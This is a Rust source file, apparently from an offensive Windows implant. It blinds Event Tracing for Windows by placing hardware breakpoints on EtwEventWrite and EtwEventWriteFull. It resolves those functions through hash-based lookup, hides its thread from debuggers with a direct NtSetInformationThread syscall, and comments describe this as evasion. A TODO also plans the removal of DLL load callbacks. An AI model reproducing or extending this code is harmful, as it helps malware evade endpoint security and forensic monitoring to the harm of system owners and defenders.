use crate::core::{amsi, hashes, resolver, ssn_table};
use crate::debug;

pub unsafe fn patch_etw() -> bool {
    unsafe {
        let table = ssn_table::syscall_table();
        let ntdll = table.modules.ntdll;
        if ntdll.is_null() {
            return false;
        }

        let mut patched = 0u32;

        // DR1: EtwEventWrite (primary ETW logging function)
        let etw_write = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITE_HASH);
        if !etw_write.is_null() {
            if amsi::set_hardware_breakpint(2, etw_write as usize) {
                debug!("[ETW] DR1 -> EtwEventWrite @ {:p}", etw_write);
                patched += 1;
            }
        }

        // DR2: EtwEventWriteFull (extended ETW logging)
        let etw_write_full = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITEFULL_HASH);
        if !etw_write_full.is_null() {
            if amsi::set_hardware_breakpint(2, etw_write_full as usize) {
                debug!("[ETW] DR2 -> EtwEventWriteFull @ {:p}", etw_write_full);
                patched += 1;
            }
        }

        debug!("[ETW] Hardware breakpints set: {}/2 - zero memory patches", patched);

        // NtSetInformationThread(ThreadHideFromDebugger = 0x11) prevents the kernel from delivering debug even for this thread which add extra evasion
        thread_hide_from_debugger();

        patched > 0
    }
}


unsafe fn thread_hide_from_debugger() {
    let table = ssn_table::syscall_table();
    let e = &table.ssns.nt_set_information_thread;
    if e.ssn == 0 { return }

    let current_thread: *mut core::ffi::c_void = -2isize as *mut core::ffi::c_void;
    let status = crate::core::invoke::syscall4(
        e.ssn, 
        e.syscall_addr as usize, 
        current_thread as usize, 
        0x11,   // ThreadHideFromDebugger 
        0,      // NULL (no buffer needed)
        0,      // zero length
    );

    if status == 0 {
        debug!("[ETW] ThreadHideFromDebugger set - thread hidden from debuggers")
    } else {
        debug!("[ETW] ThreadHideFromDebugger failed: 0x{:08X}", status)
    }
}

// TODO: Remove DLL load notification callbacks